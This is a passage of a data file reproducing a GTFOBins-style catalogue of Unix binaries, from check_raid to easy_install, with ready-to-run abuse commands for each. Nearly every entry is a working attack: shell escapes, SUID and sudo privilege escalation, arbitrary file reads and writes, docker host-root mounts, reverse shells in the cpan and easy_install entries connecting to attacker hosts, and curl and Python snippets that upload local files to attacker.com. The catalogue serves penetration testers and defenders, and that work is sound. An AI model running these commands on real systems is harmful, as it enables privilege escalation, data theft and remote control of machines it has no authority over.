                "This is the `check_raid` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.\n",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\ncheck_raid --extra-opts=@$LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo check_raid --extra-opts=@$LFILE\n",
                    },
                ],
            },
        },
        check_ssl_cert: {
            description: "This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.\n",
            functions: {
                command: [
                    {
                        description: "The host example.net must return a certificate via TLS",
                        code: 'COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho "$COMMAND | tee $OUTPUT" > $TF\nchmod +x $TF\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT\n',
                    },
                ],
                sudo: [
                    {
                        description: "The host example.net must return a certificate via TLS",
                        code: 'COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho "$COMMAND | tee $OUTPUT" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT\n',
                    },
                ],
            },
        },
        check_statusfile: {
            description:
                "This is the `check_statusfile` Nagios plugi plugin, available e.g. in `/usr/lib/nagios/plugins/`. The read file content is limited to the first line.\n",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\ncheck_statusfile $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo check_statusfile $LFILE\n",
                    },
                ],
            },
        },
        chmod: {
            description:
                "This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.",
            functions: {
                suid: [
                    {
                        code: "LFILE=file_to_change\n./chmod 6777 $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_change\nsudo chmod 6777 $LFILE\n",
                    },
                ],
            },
        },
        choom: {
            functions: {
                shell: [
                    {
                        code: "choom -n 0 /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./choom -n 0 -- /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo choom -n 0 /bin/sh",
                    },
                ],
            },
        },
        chown: {
            description:
                "This can be run with elevated privileges to change ownership and then read, write, or execute a file.",
            functions: {
                suid: [
                    {
                        code: "LFILE=file_to_change\n./chown $(id -un):$(id -gn) $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_change\nsudo chown $(id -un):$(id -gn) $LFILE\n",
                    },
                ],
            },
        },
        chroot: {
            functions: {
                suid: [
                    {
                        code: "./chroot / /bin/sh -p\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo chroot /\n",
                    },
                ],
            },
        },
        clamscan: {
            description:
                "Each line of the file is interpreted as a path and the content is leaked via error messages, thus this might not be suitable to read binary files. The output can optionally be cleaned using `sed`.",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nclamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\n./clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nTF=$(mktemp -d)\ntouch $TF/empty.yara\nsudo clamscan --no-summary -d $TF -f $LFILE 2>&1 | sed -nE 's/^(.*): No such file or directory$/\\1/p'\n",
                    },
                ],
            },
        },
        cmp: {
            description:
                "Dump the bytes of the input file that are different from the NUL byte in a tabular format, hence this may not be suitable to read arbitrary binary files.",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\ncmp $LFILE /dev/zero -b -l\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./cmp $LFILE /dev/zero -b -l\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo cmp $LFILE /dev/zero -b -l\n",
                    },
                ],
            },
        },
        cobc: {
            functions: {
                shell: [
                    {
                        code: 'TF=$(mktemp -d)\necho \'CALL "SYSTEM" USING "/bin/sh".\' > $TF/x\ncobc -xFj --frelax-syntax-checks $TF/x\n',
                    },
                ],
                sudo: [
                    {
                        code: 'TF=$(mktemp -d)\necho \'CALL "SYSTEM" USING "/bin/sh".\' > $TF/x\nsudo cobc -xFj --frelax-syntax-checks $TF/x\n',
                    },
                ],
            },
        },
        column: {
            description: "`column` expects textual data.\n",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\ncolumn $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./column $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo column $LFILE\n",
                    },
                ],
            },
        },
        comm: {
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\ncomm $LFILE /dev/null 2>/dev/null\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo comm $LFILE /dev/null 2>/dev/null\n",
                    },
                ],
            },
        },
        composer: {
            functions: {
                shell: [
                    {
                        code: 'TF=$(mktemp -d)\necho \'{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}\' >$TF/composer.json\ncomposer --working-dir=$TF run-script x\n',
                    },
                ],
                "limited-suid": [
                    {
                        code: 'TF=$(mktemp -d)\necho \'{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}\' >$TF/composer.json\n./composer --working-dir=$TF run-script x\n',
                    },
                ],
                sudo: [
                    {
                        code: 'TF=$(mktemp -d)\necho \'{"scripts":{"x":"/bin/sh -i 0<&3 1>&3 2>&3"}}\' >$TF/composer.json\nsudo composer --working-dir=$TF run-script x\n',
                    },
                ],
            },
        },
        cowsay: {
            description: "It allows to execute [`perl`](/gtfobins/perl) code, other functions may apply.",
            functions: {
                shell: [
                    {
                        code: "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\ncowsay -f $TF x\n",
                    },
                ],
                sudo: [
                    {
                        code: "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowsay -f $TF x\n",
                    },
                ],
            },
        },
        cowthink: {
            description: "It allows to execute [`perl`](/gtfobins/perl) code, other functions may apply.",
            functions: {
                shell: [
                    {
                        code: "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\ncowthink -f $TF x\n",
                    },
                ],
                sudo: [
                    {
                        code: "TF=$(mktemp)\necho 'exec \"/bin/sh\";' >$TF\nsudo cowthink -f $TF x\n",
                    },
                ],
            },
        },
        cp: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\ncp "$LFILE" /dev/stdout\n',
                    },
                ],
                "file-write": [
                    {
                        code: 'LFILE=file_to_write\necho "DATA" | cp /dev/stdin "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_write\necho "DATA" | ./cp /dev/stdin "$LFILE"\n',
                    },
                    {
                        description:
                            "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)",
                        code: 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\n./cp $TF $LFILE\n',
                    },
                    {
                        description:
                            "This can copy SUID permissions from any SUID binary (e.g., `cp` itself) to another.",
                        code: 'LFILE=file_to_change\n./cp --attributes-only --preserve=all ./cp "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_write\necho "DATA" | sudo cp /dev/stdin "$LFILE"\n',
                    },
                    {
                        description:
                            "This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)",
                        code: 'LFILE=file_to_write\nTF=$(mktemp)\necho "DATA" > $TF\nsudo cp $TF $LFILE\n',
                    },
                    {
                        description:
                            "This overrides `cp` itself with a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `cp` by path. Warning, this is a destructive action.",
                        code: "sudo cp /bin/sh /bin/cp\nsudo cp\n",
                    },
                ],
            },
        },
        cpan: {
            functions: {
                shell: [
                    {
                        description: "`cpan` lets you execute perl commands with the `! command`.\n",
                        code: "cpan\n! exec '/bin/bash'\n",
                    },
                ],
                "reverse-shell": [
                    {
                        description: "Run `nc -lvp RPORT` on the attacker box to receive the shell.",
                        code: 'export RHOST=localhost\nexport RPORT=9000\ncpan\n! use Socket; my $i="$ENV{RHOST}"; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S"); open(STDOUT,">&S"); open(STDERR,">&S"); exec("/bin/sh -i");};\n',
                    },
                ],
                "file-upload": [
                    {
                        description:
                            "Serve files in the local folder running an HTTP server on port 8080. Install the dependency via `cpan HTTP::Server::Simple`.",
                        code: "cpan\n! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();\n",
                    },
                ],
                "file-download": [
                    {
                        description: "Fetch a remote file via an HTTP GET request and store it in `PWD`.",
                        code: 'export URL=http://attacker.com/file_to_get\ncpan\n! use File::Fetch; my $file = (File::Fetch->new(uri => "$ENV{URL}"))->fetch();\n',
                    },
                ],
                sudo: [
                    {
                        code: "sudo cpan\n! exec '/bin/bash'\n",
                    },
                ],
            },
        },
        cpio: {
            functions: {
                shell: [
                    {
                        code: "echo '/bin/sh </dev/tty >/dev/tty' >localhost\ncpio -o --rsh-command /bin/sh -F localhost:\n",
                    },
                ],
                "file-read": [
                    {
                        description:
                            "The content of the file is printed to standard output, between the cpio archive format header and footer.",
                        code: 'LFILE=file_to_read\necho "$LFILE" | cpio -o\n',
                    },
                    {
                        description: "The whole directory structure is copied to `$TF`.",
                        code: 'LFILE=file_to_read\nTF=$(mktemp -d)\necho "$LFILE" | cpio -dp $TF\ncat "$TF/$LFILE"\n',
                    },
                ],
                "file-write": [
                    {
                        description: "Copies `$LFILE` to the `$LDIR` directory.",
                        code: "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | cpio -up $LDIR\n",
                    },
                ],
                suid: [
                    {
                        description: "The whole directory structure is copied to `$TF`.",
                        code: 'LFILE=file_to_read\nTF=$(mktemp -d)\necho "$LFILE" | ./cpio -R $UID -dp $TF\ncat "$TF/$LFILE"\n',
                    },
                    {
                        description: "Copies `$LFILE` to the `$LDIR` directory.",
                        code: "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | ./cpio -R 0:0 -p $LDIR\n",
                    },
                ],
                sudo: [
                    {
                        code: "echo '/bin/sh </dev/tty >/dev/tty' >localhost\nsudo cpio -o --rsh-command /bin/sh -F localhost:\n",
                    },
                    {
                        description: "The whole directory structure is copied to `$TF`.",
                        code: 'LFILE=file_to_read\nTF=$(mktemp -d)\necho "$LFILE" | sudo cpio -R $UID -dp $TF\ncat "$TF/$LFILE"\n',
                    },
                    {
                        description: "Copies `$LFILE` to the `$LDIR` directory.",
                        code: "LFILE=file_to_write\nLDIR=where_to_write\necho DATA >$LFILE\necho $LFILE | sudo cpio -R 0:0 -p $LDIR\n",
                    },
                ],
            },
        },
        cpulimit: {
            functions: {
                shell: [
                    {
                        code: "cpulimit -l 100 -f /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./cpulimit -l 100 -f -- /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo cpulimit -l 100 -f /bin/sh",
                    },
                ],
            },
        },
        crash: {
            functions: {
                shell: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "crash -h\n!sh\n",
                    },
                ],
                command: [
                    {
                        code: "COMMAND='/usr/bin/id'\nCRASHPAGER=\"$COMMAND\" crash -h\n",
                    },
                ],
                sudo: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "sudo crash -h\n!sh\n",
                    },
                ],
            },
        },
        crontab: {
            functions: {
                command: [
                    {
                        description:
                            "The commands are executed according to the crontab file edited via the `crontab` utility.",
                        code: "crontab -e",
                    },
                ],
                sudo: [
                    {
                        description:
                            "The commands are executed according to the crontab file edited via the `crontab` utility.",
                        code: "sudo crontab -e",
                    },
                ],
            },
        },
        csh: {
            functions: {
                shell: [
                    {
                        code: "csh",
                    },
                ],
                "file-write": [
                    {
                        code: "export LFILE=file_to_write\nash -c 'echo DATA > $LFILE'\n",
                    },
                ],
                suid: [
                    {
                        code: "./csh -b",
                    },
                ],
                sudo: [
                    {
                        code: "sudo csh",
                    },
                ],
            },
        },
        csplit: {
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n",
                    },
                ],
                "file-write": [
                    {
                        description:
                            "Writes the data to `xx0file_to_write`. If needed, a different prefix can be specified with `-f` (instead of `xx`).",
                        code: 'TF=$(mktemp)\necho "DATA" > $TF\nLFILE=file_to_write\ncsplit -z -b "%d$LFILE" $TF 1\n',
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\ncsplit $LFILE 1\ncat xx01\n",
                    },
                ],
            },
        },
        csvtool: {
            functions: {
                "file-read": [
                    {
                        description:
                            "The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.",
                        code: "LFILE=file_to_read\ncsvtool trim t $LFILE\n",
                    },
                ],
                "file-write": [
                    {
                        description:
                            "The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.",
                        code: "LFILE=file_to_write\nTF=$(mktemp)\necho DATA > $TF\ncsvtool trim t $TF -o $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./csvtool trim t $LFILE\n",
                    },
                ],
                shell: [
                    {
                        code: "csvtool call '/bin/sh;false' /etc/passwd",
                    },
                ],
                sudo: [
                    {
                        code: "sudo csvtool call '/bin/sh;false' /etc/passwd",
                    },
                ],
            },
        },
        cupsfilter: {
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\ncupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE\n",
                    },
                ],
            },
        },
        curl: {
            functions: {
                "file-upload": [
                    {
                        description:
                            "Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Omit the `@` to send hard-coded data.",
                        code: 'URL=http://attacker.com/\nLFILE=file_to_send\ncurl -X POST -d "@$LFILE" $URL\n',
                    },
                ],
                "file-download": [
                    {
                        description: "Fetch a remote file via HTTP GET request.",
                        code: "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\ncurl $URL -o $LFILE\n",
                    },
                ],
                "file-read": [
                    {
                        description: "The file path must be absolute.",
                        code: "LFILE=/tmp/file_to_read\ncurl file://$LFILE\n",
                    },
                ],
                "file-write": [
                    {
                        description: "The file path must be absolute.",
                        code: 'LFILE=file_to_write\nTF=$(mktemp)\necho DATA >$TF\ncurl "file://$TF" -o "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        description: "Fetch a remote file via HTTP GET request.",
                        code: "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\n./curl $URL -o $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        description: "Fetch a remote file via HTTP GET request.",
                        code: "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nsudo curl $URL -o $LFILE\n",
                    },
                ],
            },
        },
        cut: {
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\ncut -d "" -f1 "$LFILE"\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./cut -d "" -f1 "$LFILE"\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo cut -d "" -f1 "$LFILE"\n',
                    },
                ],
            },
        },
        dash: {
            functions: {
                shell: [
                    {
                        code: "dash",
                    },
                ],
                "file-write": [
                    {
                        code: "export LFILE=file_to_write\ndash -c 'echo DATA > $LFILE'\n",
                    },
                ],
                suid: [
                    {
                        code: "./dash -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo dash",
                    },
                ],
            },
        },
        date: {
            description:
                "Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.\n\nThis only works for the GNU variant of `date`.\n",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\ndate -f $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./date -f $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo date -f $LFILE\n",
                    },
                ],
            },
        },
        dc: {
            functions: {
                shell: [
                    {
                        code: "dc -e '!/bin/sh'",
                    },
                ],
                sudo: [
                    {
                        code: "sudo dc -e '!/bin/sh'",
                    },
                ],
                "limited-suid": [
                    {
                        code: "./dc -e '!/bin/sh'",
                    },
                ],
            },
        },
        dd: {
            functions: {
                "file-write": [
                    {
                        code: 'LFILE=file_to_write\necho "DATA" | dd of=$LFILE\n',
                    },
                ],
                "file-read": [
                    {
                        code: "LFILE=file_to_read\ndd if=$LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_write\necho "data" | ./dd of=$LFILE\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_write\necho "data" | sudo dd of=$LFILE\n',
                    },
                ],
            },
        },
        debugfs: {
            functions: {
                shell: [
                    {
                        code: "debugfs\n!/bin/sh\n",
                    },
                ],
                suid: [
                    {
                        code: "./debugfs\n!/bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        code: "sudo debugfs\n!/bin/sh\n",
                    },
                ],
            },
        },
        dialog: {
            description:
                "The file is shown in an interactive TUI dialog, thus it is not suitable for binary/too big data.",
            functions: {
                "file-read": [
                    {
                        code: 'LFILE=file_to_read\ndialog --textbox "$LFILE" 0 0\n',
                    },
                ],
                suid: [
                    {
                        code: 'LFILE=file_to_read\n./dialog --textbox "$LFILE" 0 0\n',
                    },
                ],
                sudo: [
                    {
                        code: 'LFILE=file_to_read\nsudo dialog --textbox "$LFILE" 0 0\n',
                    },
                ],
            },
        },
        diff: {
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\ndiff --line-format=%L /dev/null $LFILE\n",
                    },
                    {
                        description:
                            "This lists the content of a directory. `$TF` can be any directory, but for convenience it is better to use an empty directory to avoid noise output.",
                        code: "LFOLDER=folder_to_list\nTF=$(mktemp -d)\ndiff --recursive $TF $LFOLDER\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./diff --line-format=%L /dev/null $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo diff --line-format=%L /dev/null $LFILE\n",
                    },
                ],
            },
        },
        dig: {
            description:
                "Each input line is treated as a lookup query for the `dig` command and the output is corrupted with the result or errors of the operation, so this may not be suitable for binary files. Grepping for `DiG` might help to filter out unwanted content.",
            functions: {
                "file-read": [
                    {
                        code: "LFILE=file_to_read\ndig -f $LFILE\n",
                    },
                ],
                sudo: [
                    {
                        code: "LFILE=file_to_read\nsudo dig -f $LFILE\n",
                    },
                ],
                suid: [
                    {
                        code: "LFILE=file_to_read\n./dig -f $LFILE\n",
                    },
                ],
            },
        },
        distcc: {
            functions: {
                shell: [
                    {
                        code: "distcc /bin/sh",
                    },
                ],
                suid: [
                    {
                        code: "./distcc /bin/sh -p",
                    },
                ],
                sudo: [
                    {
                        code: "sudo distcc /bin/sh",
                    },
                ],
            },
        },
        dmesg: {
            functions: {
                "file-read": [
                    {
                        description: "This is not suitable for binary files.",
                        code: 'LFILE=file_to_read\ndmesg -rF "$LFILE"\n',
                    },
                ],
                shell: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "dmesg -H\n!/bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "sudo dmesg -H\n!/bin/sh\n",
                    },
                ],
            },
        },
        dmidecode: {
            functions: {
                sudo: [
                    {
                        description:
                            'It can be used to overwrite files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode.\nGenerate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.\n\n- `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.\n\n- `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.\n\n```\nmake dmiwrite\nTF=$(mktemp)\necho "DATA" > $TF\n./dmiwrite $TF x.dmi\n```\n',
                        code: 'LFILE=file_to_write\nsudo dmidecode --no-sysfs -d x.dmi --dump-bin "$LFILE"\n',
                    },
                ],
            },
        },
        dmsetup: {
            functions: {
                sudo: [
                    {
                        code: "sudo dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\nsudo dmsetup ls --exec '/bin/sh -s'\n",
                    },
                ],
                suid: [
                    {
                        code: "./dmsetup create base <<EOF\n0 3534848 linear /dev/loop0 94208\nEOF\n./dmsetup ls --exec '/bin/sh -p -s'\n",
                    },
                ],
            },
        },
        dnf: {
            functions: {
                sudo: [
                    {
                        description:
                            "It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'id' > $TF/x.sh\nfpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF\n```\n",
                        code: "sudo dnf install -y x-1.0-1.noarch.rpm\n",
                    },
                ],
            },
        },
        docker: {
            description:
                "This requires the user to be privileged enough to run docker, i.e. being in the `docker` group or being `root`.\n\nAny other Docker Linux image should work, e.g., `debian`.\n",
            functions: {
                shell: [
                    {
                        description: "The resulting is a root shell.",
                        code: "docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                    },
                ],
                "file-write": [
                    {
                        description:
                            "Write a file by copying it to a temporary container and back to the target destination on the host.",
                        code: 'CONTAINER_ID="$(docker run -d alpine)" # or existing\nTF=$(mktemp)\necho "DATA" > $TF\ndocker cp $TF $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF file_to_write\n',
                    },
                ],
                "file-read": [
                    {
                        description:
                            "Read a file by copying it to a temporary container and back to a new location on the host.",
                        code: 'CONTAINER_ID="$(docker run -d alpine)"  # or existing\nTF=$(mktemp)\ndocker cp file_to_read $CONTAINER_ID:$TF\ndocker cp $CONTAINER_ID:$TF $TF\ncat $TF\n',
                    },
                ],
                sudo: [
                    {
                        description: "The resulting is a root shell.",
                        code: "sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                    },
                ],
                suid: [
                    {
                        description: "The resulting is a root shell.",
                        code: "./docker run -v /:/mnt --rm -it alpine chroot /mnt sh",
                    },
                ],
            },
        },
        dos2unix: {
            functions: {
                "file-write": [
                    {
                        code: 'LFILE1=file_to_read\nLFILE2=file_to_write\ndos2unix -f -n "$LFILE1" "$LFILE2"\n',
                    },
                ],
            },
        },
        dosbox: {
            description:
                "Basically `dosbox` allows to mount the local file system, so that it can be altered using DOS commands. Note that the DOS filename convention ([8.3](https://en.wikipedia.org/wiki/8.3_filename)) is used.",
            functions: {
                "file-read": [
                    {
                        description: "The file content will be displayed in the DOSBox graphical window.",
                        code: "LFILE='\\path\\to\\file_to_read'\ndosbox -c 'mount c /' -c \"type c:$LFILE\"\n",
                    },
                    {
                        description: "The file is copied to a readable location.",
                        code: "LFILE='\\path\\to\\file_to_read'\ndosbox -c 'mount c /' -c \"copy c:$LFILE c:\\tmp\\output\" -c exit\ncat '/tmp/OUTPUT'\n",
                    },
                ],
                "file-write": [
                    {
                        description:
                            "Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\\r\\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.",
                        code: "LFILE='\\path\\to\\file_to_write'\ndosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n",
                    },
                ],
                suid: [
                    {
                        description:
                            "Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\\r\\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.",
                        code: "LFILE='\\path\\to\\file_to_write'\n./dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n",
                    },
                ],
                sudo: [
                    {
                        description:
                            "Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\\r\\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.",
                        code: "LFILE='\\path\\to\\file_to_write'\nsudo dosbox -c 'mount c /' -c \"echo DATA >c:$LFILE\" -c exit\n",
                    },
                ],
            },
        },
        dotnet: {
            functions: {
                shell: [
                    {
                        code: 'dotnet fsi\nSystem.Diagnostics.Process.Start("/bin/sh").WaitForExit();;\n',
                    },
                ],
                "file-read": [
                    {
                        code: 'export LFILE=file_to_read\ndotnet fsi\nSystem.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable("LFILE"));;\n',
                    },
                ],
                sudo: [
                    {
                        code: 'sudo dotnet fsi\nSystem.Diagnostics.Process.Start("/bin/sh").WaitForExit();;\n',
                    },
                ],
            },
        },
        dpkg: {
            functions: {
                shell: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "dpkg -l\n!/bin/sh\n",
                    },
                ],
                sudo: [
                    {
                        description:
                            "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
                        code: "sudo dpkg -l\n!/bin/sh\n",
                    },
                    {
                        description:
                            "It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n```\nTF=$(mktemp -d)\necho 'exec /bin/sh' > $TF/x.sh\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n```\n",
                        code: "sudo dpkg -i x_1.0_all.deb",
                    },
                ],
            },
        },
        dstat: {
            description:
                '`dstat` allows you to run arbitrary [`python`](/gtfobins/python/) scripts loaded as "external plugins" if they are located in one of the directories stated in the `dstat` man page under "FILES":\n\n1. `~/.dstat/`\n2. `(path of binary)/plugins/`\n3. `/usr/share/dstat/`\n4. `/usr/local/share/dstat/`\n\nPick the one that you can write into.\n',
            functions: {
                shell: [
                    {
                        code: 'mkdir -p ~/.dstat\necho \'import os; os.execv("/bin/sh", ["sh"])\' >~/.dstat/dstat_xxx.py\ndstat --xxx\n',
                    },
                ],
                sudo: [
                    {
                        code: 'echo \'import os; os.execv("/bin/sh", ["sh"])\' >/usr/local/share/dstat/dstat_xxx.py\nsudo dstat --xxx\n',
                    },
                ],
            },
        },
        dvips: {
            description:
                "The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target.",
            functions: {
                shell: [
                    {
                        code: "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\ndvips -R0 texput.dvi\n",
                    },
                ],
                sudo: [
                    {
                        code: "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\nsudo dvips -R0 texput.dvi\n",
                    },
                ],
                "limited-suid": [
                    {
                        code: "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\n./dvips -R0 texput.dvi\n",
                    },
                ],
            },
        },
        easy_install: {
            functions: {
                shell: [
                    {
                        code: "TF=$(mktemp -d)\necho \"import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')\" > $TF/setup.py\neasy_install $TF\n",
                    },
                ],
                "reverse-shell": [
                    {
                        description:
                            "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.",
                        code: 'export RHOST=attacker.com\nexport RPORT=12345\nTF=$(mktemp -d)\necho \'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn("/bin/sh")\' > $TF/setup.py\neasy_install $TF\n',
                    },
                ],
                "file-upload": [
                    {
                        description:
                            'Send local file via "d" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.',
                        code: 'export URL=http://attacker.com/\nexport LFILE=file_to_send\nTF=$(mktemp -d)\necho \'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e["URL"], bytes(u.urlencode({"d":open(e["LFILE"]).read()}).encode()))\' > $TF/setup.py\neasy_install $TF\n',
                    },
                    {
                        description: "Serve files in the local folder running an HTTP server.",
                        code: 'export LPORT=8888\nTF=$(mktemp -d)\necho \'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer(("", int(e["LPORT"])), s.SimpleHTTPRequestHandler).serve_forever()\' > $TF/setup.py\neasy_install $TF\n',
                    },
                ],
